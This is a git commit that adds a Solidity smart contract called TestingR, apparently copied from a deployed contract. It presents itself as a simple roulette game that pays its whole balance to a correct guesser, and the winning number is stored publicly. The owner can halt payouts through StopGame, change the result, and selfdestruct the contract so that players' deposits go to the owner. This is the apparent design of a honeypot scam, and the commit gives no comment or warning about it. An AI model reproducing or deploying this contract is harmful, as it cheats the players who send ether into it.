dfa82ec97148458d601cf22022139e706d982699
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 10:01:19 +0700

    add contract TestingR

---
+++ TestingR.sol
@@ -0,0 +1,57 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract TestingR at 0xbae339b730cb3a58eff2f2f2fa4af579332c3e1c
+*/
+pragma solidity ^0.4.20;
+
+contract TestingR
+{
+
+    uint8 public result = 0;
+
+    bool finished = false;
+
+    address rouletteOwner;
+
+    function Play(uint8 _number)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(result == _number && msg.value>0.01 ether && !finished)
+        {
+            msg.sender.transfer(this.balance);
+            GiftHasBeenSent();
+        }
+    }
+
+    function StartRoulette(uint8 _number)
+    public
+    payable
+    {
+        if(result==0)
+        {
+            result = _number;
+            rouletteOwner = msg.sender;
+        }
+    }
+
+    function StopGame(uint8 _number)
+    public
+    payable
+    {
+        require(msg.sender == rouletteOwner);
+        GiftHasBeenSent();
+        result = _number;
+        if (msg.value>0.008 ether){
+            selfdestruct(rouletteOwner);
+        }
+    }
+
+    function GiftHasBeenSent()
+    private
+    {
+        finished = true;
+    }
+
+    function() public payable{}
+}
